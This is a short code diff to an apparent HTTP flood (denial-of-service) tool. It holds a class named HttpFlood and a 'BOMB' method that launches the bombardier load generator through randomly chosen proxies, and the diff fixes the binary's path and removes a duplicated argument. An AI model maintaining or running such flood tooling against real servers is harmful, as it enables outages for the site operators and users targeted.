@@ -878,7 +878,6 @@ class HttpFlood(Thread):
         pro = randchoice(self._proxies)
 
         run([
-            f'{Path.home() / "go/bin/bombardier"}',
             f'{bombardier_path}',
             f'--connections={self._rpc}',
             '--http2',
@@ -1327,7 +1326,7 @@ if __name__ == '__main__':
                                     argv[5].strip())
                     useragent_li = Path(__dir__ / "files/useragent.txt")
                     referers_li = Path(__dir__ / "files/referers.txt")
-                    bombardier_path = Path(__dir__ / "go/bin/bombardier")
+                    bombardier_path = Path.home() / "go/bin/bombardier"
                     proxies: Any = set()
 
                     if method == "BOMB":
